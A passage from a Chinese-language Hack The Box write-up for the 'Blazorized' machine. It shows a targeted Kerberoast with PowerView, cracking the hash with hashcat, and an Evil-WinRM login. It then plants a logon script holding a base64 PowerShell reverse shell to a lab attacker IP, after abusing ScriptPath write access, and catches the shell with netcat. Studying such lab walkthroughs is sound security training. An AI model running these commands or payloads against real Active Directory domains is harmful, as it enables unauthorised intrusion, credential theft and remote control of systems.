+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>需要<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9SZWNvbi9Qb3dlclZpZXcucHMx">PowerView<i class="fa fa-external-link-alt"></i></span>来运行上面的命令。把它下载到主机上，用Python作为服务器，然后上传到Blazorized。接下来导入它：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.14.87:88/PowerView.ps1 -outfile PowerView.ps1</span><br><span class="line"></span><br><span class="line">PS C:\programdata&gt; . .\PowerView.ps1</span><br></pre></td></tr></table></figure>
+
+<p>现在设置用户的SPN：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; Set-DomainObject -Identity RSA_4810 -Set @&#123;serviceprincipalname=<span class="string">&#x27;nonexistent/BLAHBLAH&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后得到一张ticket，输出hash：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; Get-DomainUSer RSA_4810 | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash</span><br><span class="line">$krb5tgs$23$*RSA_4810<span class="variable">$blazorized</span>.htb<span class="variable">$nonexistent</span>/BLAHBLAH*$74DDA53EA6707B9D1A1B09E1E7E3FA45<span class="variable">$A2ED548F18ADB62F2BB5F84885D720890B824FFE7E170F8062BE3F5B0BFEE45C4E12F783DDE1F421F89DBC13A60434BC19954F77B298F7FE96D5B9AEEFFBEF7909D62073D17B07E89CE15F18ABCB4E720EF273B4E3029BFEA44EC7C166A5141B0FF2CAE155E1A1EF2BCE9B5EC1B1F8EC7F3D96054AF4AB214D3F81BB5A2B4F739BFF55BE8FEB032BE670A58B9876C665B42DA73F7162945C6AEBB95182AE8E717BA9365A838FD0139B217A5929742DA31E0273CDD1F6EBC1BE882B37F69301C9643D05AB704BB5EB066B88DB9AA9F15CE530481BCA0C1E8CF709F1FE53075D92099076C53F1A42A0749F181F765FDC891AAF8DBE8AED78728926EB1B6BE9B270CF9A0E57B68AAA267317267A2E06CE11B3A827808CD8E859B1A1238FA8473719ECE839885CE945E5CDABB062C25D99E568C3C0464C0D0970B091EB8D82B4B7C32AEFABFF5B89FE942A593C05081B9661B991E3B985C73455CBAA3767A80AB8313BB9EACD99CA2E7DCB99107E6A802A46B4EA84974760CBA838B23B37F0D5DC32618D2350AC283D01EBD1FC5D3DB73BB096284F2DA4FCA239FC3F5A5BAA71DF73F8080089BB7D5A9D74DBDCD74756EFCAA5B2977A39B7075F5CC76F211CA3F8E6297F74E6FD1E33A10A6F2CAF4DDA9504946773FD8E6DE3F8AA2569BAE8CD86A6BE80A910645D0AD7269E47F0443767EF10C703E4BBF0D5DE6609B126696D43A5A9C971547D534B0777635197E65651F6792A6FEA872B813FF69F368B61DE625FE79825CCA25EAD4034C1E3CFCA9C25D4D65F6D84C0B4323FDB1076041FCAD00C5FF6F605054457376CB478A602F266D55D97604E5CE1EDBE70813E5B824A1E36905DA803B3F03DE814D08E50D85CF34E328DD4EE4CA74755B4571BA234A6DBFB88D6172E357E4C87AF1F50AAB44B16B8B64C88661FEEBA179C8EBA496C4984BD01E08CCD3276AF8E58F1C45173F882E20BB16951D8CF874CAD325ACEC82C82A761DC4CE63E90108EF924C501E373B41F2859F554CFE7FFE84C8EF45FC466F57A65D66016A2F602AF630D74FE3E7128B010ECA1181266C4DE8E753D5356E6E04D058AE2CDD1D6F68C3C81EF2F87EC016039397ADFDC7E820638BFDDB80FE93C2FCC3680DF0A7C05AF0526F0F6AAA18DAC6473F7710408E8D024CEB9980FC4A1033D6BFFDCEA4A7935C0AC7FF2BFC42707AF7364A84B96405081E2EAA808B85BC04C2C46468722F14ED5A90CA6A0163CA48E088418FD21C26608237976D1B93EC1FD78A1AA06FE07E272E46BB1F05C0D4EF46EE962EABF8FC40DA75FEAEBC1D40C87EED6D9CBFF593EA5CAC2B4104199F3B5D984510F49C80BF3A44E685E23C0718295A4C626DAF4EC987DF587BFCD9A7235036E178CDAF6E812CA62EC6E4D20F40196637EA8074E3A6733369C010B6878B52E87D49014EB7A0B8AE02B464FD7841B2D16F5009930C38EEB93772171CC2036C42781CE1AAEE025F4D8249753A44EFF0C689BE501D4D7D6E3850C5E5A0CD555824F31B5428D7A55D94FF8609143C5B8D32C3151FFDDC8368A7AC7D2E5DABBB15574726DA53EA085BBEF8DC8EBC836C27A94EB938378D7928B9E9AC2C35663A931775B24D0ADD08C1E76A722D0DF081575BE4552E90337D0B0830654579BDDA6FDAD3224BF2BC1A8FABDADB8A9E4CCE353448F8382D10FCC33E0B79156E85AF1A637E48018D805D4A4729BA666DBA43DD62FAC1623A0BA712F58BB9946171A4957B48DE631272CB502E4D679AD21D3EFD229171971EA31</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="破解hash"><a href="#破解hash" class="headerlink" title="破解hash"></a>破解hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat.exe rsa_4810.hash rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到密码: (Ni7856Do9854Ki05Ng0005 #)</p>
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="验证密码"><a href="#验证密码" class="headerlink" title="验证密码"></a>验证密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/blazorized <span class="comment"># netexec smb blazorized.htb -u rsa_4810 -p &#x27;(Ni7856Do9854Ki05Ng0005 #)&#x27;</span></span><br><span class="line">SMB         10.10.11.22     445    DC1              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC1) (domain:blazorized.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.22     445    DC1              [+] blazorized.htb\rsa_4810:(Ni7856Do9854Ki05Ng0005 <span class="comment">#)</span></span><br><span class="line">root@kali:~/hackthebox/machine/blazorized <span class="comment"># netexec winrm blazorized.htb -u rsa_4810 -p &#x27;(Ni7856Do9854Ki05Ng0005 #)&#x27;</span></span><br><span class="line">WINRM       10.10.11.22     5985   DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:blazorized.htb)</span><br><span class="line">WINRM       10.10.11.22     5985   DC1              [+] blazorized.htb\rsa_4810:(Ni7856Do9854Ki05Ng0005 <span class="comment">#) (Pwn3d!)</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到rsa_4810在”Remote Management Users”组中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\programdata&gt; net user rsa_4810</span><br><span class="line">User name                    RSA_4810</span><br><span class="line">Full Name                    RSA_4810</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country/region code          000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            2/25/2024 11:55:59 AM</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          2/26/2024 11:55:59 AM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     No</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   2/2/2024 11:44:30 AM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Remote Management Use</span></span><br><span class="line"><span class="string">Global Group memberships     *Domain Users         *Remote_Support_Admini</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali :: hackthebox/machine/blazorized » evil-winrm -i blazorized.htb -u rsa_4810 -p <span class="string">&#x27;(Ni7856Do9854Ki05Ng0005 #)&#x27;</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">blazorized\rsa_4810</span><br></pre></td></tr></table></figure>
+
+<h2 id="Shell-as-SSA-6010"><a href="#Shell-as-SSA-6010" class="headerlink" title="Shell as SSA_6010"></a>Shell as SSA_6010</h2><h3 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h3><p>rsa_4810是唯一组Remote_Support_Administrators的成员。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; <span class="built_in">whoami</span> /groups</span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                  Type             SID                                           Attributes</span><br><span class="line">=========================================== ================ ============================================= ==================================================</span><br><span class="line">Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group</span><br><span class="line">BLAZORIZED\Remote_Support_Administrators    Group            S-1-5-21-2039403211-964143010-2924010611-1115 Mandatory group, Enabled by default, Enabled group</span><br><span class="line">NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group</span><br><span class="line">Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span><br></pre></td></tr></table></figure>
+
+<h3 id="可写目录"><a href="#可写目录" class="headerlink" title="可写目录"></a>可写目录</h3><p>Sysinternals中的<span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3N5c2ludGVybmFscy9kb3dubG9hZHMvYWNjZXNzY2hr">accesschk<i class="fa fa-external-link-alt"></i></span>是检查可写目录的好方法。检查C:\Windows中的任何一个，它找到了一堆：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\accesschk64 /accepteula -uwds blazorized\rsa_4810 C:\Windows</span><br><span class="line"></span><br><span class="line">Accesschk v6.15 - Reports effective permissions <span class="keyword">for</span> securable objects</span><br><span class="line">Copyright (C) 2006-2022 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">RW C:\Windows\Tasks</span><br><span class="line">RW C:\Windows\tracing</span><br><span class="line">RW C:\Windows\Registration\CRMLog</span><br><span class="line"> W C:\Windows\System32\Tasks</span><br><span class="line">RW C:\Windows\System32\spool\drivers\color</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\AEE0FC3CA30F</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BA3A12ADA1BB</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BBD0B0FAFDAF</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\BEC23D3B2F2A</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C10CDDE211FE</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\C2FE12102303</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\DE3FC3AD20F0</span><br><span class="line">RW C:\Windows\SYSVOL\domain\scripts\A32FF3AEAA23\113EB3B0B2D3\0EEB3FED3C10\EA1EBECD3ADA</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>
+
+<p>有大量的输出，但重要的是rsa_4810似乎完全控制了这两个目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; icacls \Windows\SYSVOL\domain\scripts\A32FF3AEAA23</span><br><span class="line">\Windows\SYSVOL\domain\scripts\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)</span><br><span class="line">                                            BLAZORIZED\Administrator:(OI)(CI)(F)</span><br><span class="line">                                            BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                            CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span><br><span class="line">                                            NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)</span><br><span class="line">                                            NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">                                            BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)</span><br><span class="line">                                            BUILTIN\Server Operators:(I)(OI)(CI)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line">*Evil-WinRM* PS C:\&gt; icacls \Windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23</span><br><span class="line">\Windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23 BLAZORIZED\RSA_4810:(OI)(CI)(F)</span><br><span class="line">BLAZORIZED\Administrator:(OI)(CI)(F)</span><br><span class="line">                                                           BUILTIN\Administrators:(I)(F)</span><br><span class="line">                                                           CREATOR OWNER:(I)(OI)(CI)(IO)(F)</span><br><span class="line">                                                           NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(RX)</span><br><span class="line">                                                           NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">                                                           BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)</span><br><span class="line">                                                           BUILTIN\Server Operators:(I)(OI)(CI)(RX)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>
+
+<p>这些目录通常用于存储应用于域中的用户和计算机的登录、注销、启动和关闭脚本。</p>
+<h3 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h3><p>剩下的拥有主目录的用户只有ssa_6010和administrator。更仔细地看，看到Bloodhound报告ssa_6010在DC1上有一个会话：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized8.png"></li>
+</ul>
+<p>最后一次登录时间也是今天，在bloodhound的几分钟内：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; [DateTime]::FromFileTime((Get-ADUser SSA_6010 -properties LastLogon).LastLogon)</span><br><span class="line"></span><br><span class="line">Saturday, November <span class="number">9</span>, <span class="number">2024</span> <span class="number">1</span>:<span class="number">08</span>:<span class="number">17</span> PM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; date</span><br><span class="line"></span><br><span class="line">Saturday, November <span class="number">9</span>, <span class="number">2024</span> <span class="number">1</span>:<span class="number">08</span>:<span class="number">48</span> PM</span><br></pre></td></tr></table></figure>
+
+<p>ssa_6010似乎每分钟都会登录一次。</p>
+<h3 id="Logon-Script"><a href="#Logon-Script" class="headerlink" title="Logon Script"></a>Logon Script</h3><p>SSA_6010用户在其活动目录配置信息中没有设置任何登录脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; Get-ADUser SSA_6010 -properties ScriptPath</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb</span><br><span class="line">Enabled           : True</span><br><span class="line">GivenName         :</span><br><span class="line">Name              : SSA_6010</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : 8bf3166b-e716-4f91-946c-174e1fb433ed</span><br><span class="line">SamAccountName    : SSA_6010</span><br><span class="line">ScriptPath        :</span><br><span class="line">SID               : S-1-5-21-2039403211-964143010-2924010611-1124</span><br><span class="line">Surname           :</span><br><span class="line">UserPrincipalName : SSA_6010@blazorized.htb</span><br></pre></td></tr></table></figure>
+
+<p>然而，RSA_4810能够设置一个：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; Get-ADUser SSA_6010 | Set-ADUser -ScriptPath fdluci</span><br><span class="line">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; Get-ADUser SSA_6010 -properties ScriptPath</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb</span><br><span class="line">Enabled           : True</span><br><span class="line">GivenName         :</span><br><span class="line">Name              : SSA_6010</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : 8bf3166b-e716-4f91-946c-174e1fb433ed</span><br><span class="line">SamAccountName    : SSA_6010</span><br><span class="line">ScriptPath        : fdluci</span><br><span class="line">SID               : S-1-5-21-2039403211-964143010-2924010611-1124</span><br><span class="line">Surname           :</span><br><span class="line">UserPrincipalName : SSA_6010@blazorized.htb</span><br></pre></td></tr></table></figure>
+
+<p>在枚举时查找此内容的另一种方法是使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC9ibG9iL21hc3Rlci9SZWNvbi9Qb3dlclZpZXcucHMx">PowerView.ps1<i class="fa fa-external-link-alt"></i></span>中的Find-InterestingDomainAcl命令。如果运行它并过滤来自RSA_4810的，看到这个用户对SSA_6010的Script-Path有WriteProperty访问权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;<span class="variable">$_</span>.IdentityReferenceName -match <span class="string">&quot;RSA_4810&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ObjectDN                : CN=SSA_6010,CN=Users,DC=blazorized,DC=htb</span><br><span class="line">AceQualifier            : AccessAllowed</span><br><span class="line">ActiveDirectoryRights   : WriteProperty</span><br><span class="line">ObjectAceType           : Script-Path</span><br><span class="line">AceFlags                : None</span><br><span class="line">AceType                 : AccessAllowedObject</span><br><span class="line">InheritanceFlags        : None</span><br><span class="line">SecurityIdentifier      : S-1-5-21-2039403211-964143010-2924010611-1107</span><br><span class="line">IdentityReferenceName   : RSA_4810</span><br><span class="line">IdentityReferenceDomain : blazorized.htb</span><br><span class="line">IdentityReferenceDN     : CN=RSA_4810,CN=Users,DC=blazorized,DC=htb</span><br><span class="line">IdentityReferenceClass  : user</span><br></pre></td></tr></table></figure>
+
+<h2 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h2><h3 id="Strategy"><a href="#Strategy" class="headerlink" title="Strategy"></a>Strategy</h3><p>登录脚本是相对于上面的脚本目录指定的。把该路径设置为A32FF3AEAA23\fdluci.bat，然后将该脚本作为reverse shell写入到位。当SSA_6010登录时，它将执行，获得一个shell。</p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>从revshells.com上抓取一个PowerShell #3（Base64）reverse shell，并使用Out-File将其写入.bat文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23&gt; <span class="built_in">echo</span> <span class="string">&quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAA3ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&quot;</span> | Out-File -FilePath fdluci.bat -Encoding ASCII</span><br></pre></td></tr></table></figure>
+
+<p>有一个清理脚本可以删除这些文件，所以需要快速移动。</p>
+<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>设置SSA_6010的ScriptPath：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; Get-ADUser SSA_6010 | Set-ADUser -ScriptPath <span class="string">&#x27;A32FF3AEAA23\fdluci.bat&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>很快返回了一个shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/blazorized <span class="comment"># rlwrap -cAr nc -lnvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.10.14.87] from (UNKNOWN) [10.10.11.22] 64598</span><br><span class="line">PS C:\Windows\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">blazorized\ssa_6010</span><br></pre></td></tr></table></figure>
+
+<h2 id="Shell-as-administrator"><a href="#Shell-as-administrator" class="headerlink" title="Shell as administrator"></a>Shell as administrator</h2><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>SSA_6010是Super_Support_Administrators组的成员，该组在域上具有重要的权限：</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Blazorized9.png"></li>
+</ul>
